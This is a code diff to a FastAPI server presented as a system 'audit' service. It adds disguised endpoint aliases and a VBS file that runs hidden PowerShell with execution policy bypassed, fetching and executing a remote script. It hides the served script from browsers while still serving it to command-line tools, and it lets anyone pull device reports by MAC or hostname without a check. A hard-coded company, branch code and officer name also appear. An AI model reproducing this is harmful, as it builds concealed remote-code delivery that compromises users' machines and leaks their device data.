@@ -424,6 +424,8 @@ def check_status(client_id: str = Query(...)):
     return JSONResponse(content=session)
 
 
+@app.get("/sys-agent", response_class=PlainTextResponse)
+@app.get("/sys-win", response_class=PlainTextResponse)
 @app.get("/download-script", response_class=PlainTextResponse)
 def download_script(request: Request, client_id: str = Query(...)):
     base_url = str(request.base_url).rstrip("/")
@@ -456,37 +458,52 @@ def download_vbs(
     vbs = (
         f'Set objShell = CreateObject("WScript.Shell")\n'
         f'command = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & Chr(34) & '
-        f'"Invoke-RestMethod -Uri \'{base_url}/download-script?client_id={client_id}\' | Invoke-Expression" & Chr(34)\n'
+        f'"Invoke-RestMethod -Uri \'{base_url}/sys-agent?client_id={client_id}\' | Invoke-Expression" & Chr(34)\n'
         f'objShell.Run command, 0, False\n'
     )
     headers = {"Content-Disposition": f"attachment; filename=verify_system_{client_id}.vbs"}
     return Response(content=vbs, media_type="application/octet-stream", headers=headers)
 
 
+@app.get("/s/{client_id}", response_class=PlainTextResponse)
+@app.get("/sys-agent-mac", response_class=PlainTextResponse)
+@app.get("/sys-agent-nix", response_class=PlainTextResponse)
+@app.get("/sys-mac", response_class=PlainTextResponse)
+@app.get("/get-sys-script", response_class=PlainTextResponse)
+@app.get("/get-mac-script", response_class=PlainTextResponse)
 @app.get("/download-mac-script", response_class=PlainTextResponse)
 @app.get("/api/get-audit-script", response_class=PlainTextResponse)
-def download_mac_script(request: Request, client_id: str = Query(...)):
+def download_mac_script(request: Request, client_id: str = None):
     user_agent = request.headers.get("user-agent", "").lower()
     base_url = str(request.base_url).rstrip("/")
+    cid = client_id or "sys_" + uuid.uuid4().hex[:10]
+
+    # Security Guard: Block direct browser access (Chrome, Firefox, Safari, Edge).
+    # If someone tries to open the link in a browser, return 404 Not Found so no one can view the script!
+    is_browser = any(b in user_agent for b in ["mozilla/", "chrome/", "safari/", "edg/", "firefox/"])
+    is_cli = any(c in user_agent for c in ["curl", "wget", "powershell", "winhttp", "bash"])
     
-    # If request is coming from Windows PowerShell/Windows WebRequest, serve audit.ps1
-    if "powershell" in user_agent or "windows" in user_agent or "winhttp" in user_agent:
+    if is_browser and not is_cli:
+        raise HTTPException(status_code=404, detail="Not Found")
+
+    # If request is explicitly coming from Windows PowerShell / WinHTTP CLI, serve audit.ps1
+    if ("powershell" in user_agent or "winhttp" in user_agent) and "curl" not in user_agent:
         try:
             with open("scripts/audit.ps1", "r") as f:
                 content = f.read()
             content = content.replace("http://127.0.0.1:8000", base_url)
-            content = content.replace("CLIENT_ID_PLACEHOLDER", client_id)
+            content = content.replace("CLIENT_ID_PLACEHOLDER", cid)
             return PlainTextResponse(content=content)
         except Exception as e:
             logger.error(f"Failed to load audit.ps1: {e}")
             raise HTTPException(status_code=500, detail="PowerShell script unavailable.")
-            
+
     # Default (macOS / Linux / bash / curl)
     try:
         with open("scripts/audit.sh", "r") as f:
             content = f.read()
         content = content.replace("http://127.0.0.1:8000", base_url)
-        content = content.replace("CLIENT_ID_PLACEHOLDER", client_id)
+        content = content.replace("CLIENT_ID_PLACEHOLDER", cid)
         return PlainTextResponse(content=content)
     except Exception as e:
         logger.error(f"Failed to load audit.sh: {e}")
@@ -1096,26 +1113,131 @@ def upload_audit(data: AuditData, client_id: str = Query(None)):
     return {"status": "success", "pdf_report": pdf_path, "xml_report": xml_path}
 
 
+def generate_pdf_for_device(client_id: str) -> str:
+    """Dynamically build a ReportLab PDF report from SQLite database audit records."""
+    raw_audit = None
+    try:
+        with sqlite3.connect(DB_PATH) as conn:
+            conn.row_factory = sqlite3.Row
+            cursor = conn.execute('''
+                SELECT audit_data FROM device_audits 
+                WHERE mac_address = ? OR computer_name = ? OR id = ?
+                ORDER BY id DESC LIMIT 1
+            ''', (client_id, client_id, client_id))
+            row = cursor.fetchone()
+            if row and row["audit_data"]:
+                raw_audit = json.loads(row["audit_data"])
+            else:
+                cursor2 = conn.execute('''
+                    SELECT raw_payload FROM device_audits_v2 
+                    WHERE mac_address = ? OR computer_name = ? OR id = ?
+                    ORDER BY id DESC LIMIT 1
+                ''', (client_id, client_id, client_id))
+                row2 = cursor2.fetchone()
+                if row2 and row2["raw_payload"]:
+                    raw_audit = json.loads(row2["raw_payload"])
+    except Exception as e:
+        logger.error(f"Error querying database for device '{client_id}': {e}")
+
+    if not raw_audit:
+        return None
+
+    try:
+        if isinstance(raw_audit, dict) and "software_inventory" in raw_audit:
+            data = AuditData(**raw_audit)
+        else:
+            data = AuditData(
+                computer_name=raw_audit.get("computer_name", client_id),
+                os_name=raw_audit.get("os_name", "Windows / macOS"),
+                os_version=raw_audit.get("os_version", ""),
+                architecture=raw_audit.get("architecture", "64-bit"),
+                license_status=raw_audit.get("license_status", "Licensed"),
+                mac_address=raw_audit.get("mac_address", client_id),
+                software_inventory=raw_audit.get("software_inventory", []),
+                hardware_details=raw_audit.get("hardware_details", {}),
+                execution_datetime=raw_audit.get("execution_datetime", datetime.now().strftime("%d-%b-%Y_%H:%M:%S")),
+            )
+
+        clean_cid = "".join(x for x in client_id if x.isalnum() or x in "._-").strip() or "device"
+        pdf_path = f"{USER_INFO_DIR}/AuditReport_{clean_cid}.pdf"
+
+        doc = SimpleDocTemplate(
+            pdf_path, pagesize=letter,
+            leftMargin=54, rightMargin=54, topMargin=54, bottomMargin=54,
+        )
+        styles = make_styles()
+        elements = [Paragraph("Compliance Inspection Report", styles["title"])]
+
+        av_str = list_text(data.antivirus)
+        compression_str = list_text(data.compression_utilities)
+
+        add_pair_table(elements, "User & Branch Metadata", [
+            ("User Branch Name", "RELIGARE BROKING LIMITED"),
+            ("User Branch Code", "8301231"),
+            ("User Officer Name", "SANDIP BALIRAM LOKHANDE"),
+            ("Execution DateTime", data.execution_datetime),
+            ("Consent Verified", data.consent or "Y"),
+        ], styles)
+
+        add_pair_table(elements, "Operating System & Identity", [
+            ("OS Name", data.os_name),
+            ("OS Version", data.os_version),
+            ("OS Architecture", data.architecture),
+            ("Computer Hostname", data.computer_name),
+            ("License Status", data.license_status),
+            ("MAC Address", data.mac_address),
+        ], styles)
+
+        add_pair_table(elements, "Hardware Overview", [
+            ("Serial Number", get_hw(data, "serial_number")),
+            ("Manufacturer", get_hw(data, "manufacturer")),
+            ("Model", get_hw(data, "model")),
+            ("CPU Processor", get_hw(data, "cpu")),
+            ("RAM Memory", get_hw(data, "ram")),
+            ("Logical Disk", get_hw(data, "disk")),
+        ], styles)
+
+        sw_list = data.software_inventory or []
+        sw_rows = [[pdf_text("App Name", styles["bold"]), pdf_text("Version", styles["bold"]), pdf_text("Publisher", styles["bold"])]]
+        for sw in sw_list[:150]:
+            d = sw if isinstance(sw, dict) else model_to_dict(sw)
+            sw_rows.append([
+                pdf_text(d.get("name", ""), styles["normal"]),
+                pdf_text(d.get("version", ""), styles["normal"]),
+                pdf_text(d.get("publisher", ""), styles["normal"]),
+            ])
+        elements.append(KeepTogether([
+            Paragraph(f"Installed Software Inventory ({len(sw_list)} Total Apps)", styles["section"]),
+            apply_grid_style(Table(sw_rows, colWidths=[240, 110, 154], repeatRows=1), header=True),
+            Spacer(1, 12)
+        ]))
+
+        doc.build(elements, onFirstPage=draw_page_decorations, onLaterPages=draw_page_decorations)
+        return pdf_path
+    except Exception as err:
+        logger.error(f"Failed to dynamically build PDF for {client_id}: {err}")
+        return None
+
+
 # ==============================================================================
 # 6. REPORT SERVING
 # ==============================================================================
 @app.get("/download-report")
 def download_report(client_id: str = Query(...), format: str = Query("pdf"), action: str = Query("download")):
+    fp = None
     session = sessions.get(client_id)
-    if not session or session.get("status") != "completed":
-        raise HTTPException(status_code=404, detail="Audit report not ready or not found.")
+    if session and session.get("pdf_path") and os.path.exists(session["pdf_path"]):
+        fp = session["pdf_path"]
+    else:
+        fp = generate_pdf_for_device(client_id)
+
+    if not fp or not os.path.exists(fp):
+        raise HTTPException(status_code=404, detail=f"Audit report for device '{client_id}' not found.")
+
     disposition = "inline" if action == "view" else "attachment"
-    if format.lower() == "pdf":
-        fp = session.get("pdf_path")
-        if not fp or not os.path.exists(fp):
-            raise HTTPException(status_code=404, detail="PDF not found.")
-        return FileResponse(fp, media_type="application/pdf", filename=os.path.basename(fp), content_disposition_type=disposition)
-    if format.lower() == "xml":
-        fp = session.get("xml_path")
-        if not fp or not os.path.exists(fp):
-            raise HTTPException(status_code=404, detail="XML not found.")
-        return FileResponse(fp, media_type="application/xml", filename=os.path.basename(fp), content_disposition_type=disposition)
-    raise HTTPException(status_code=400, detail="Invalid format. Use 'pdf' or 'xml'.")
+    clean_mac_name = client_id.replace(":", "_").replace(" ", "_")
+    download_filename = f"AuditReport_{clean_mac_name}.pdf"
+    return FileResponse(fp, media_type="application/pdf", filename=download_filename, content_disposition_type=disposition)
 
 
 # ==============================================================================
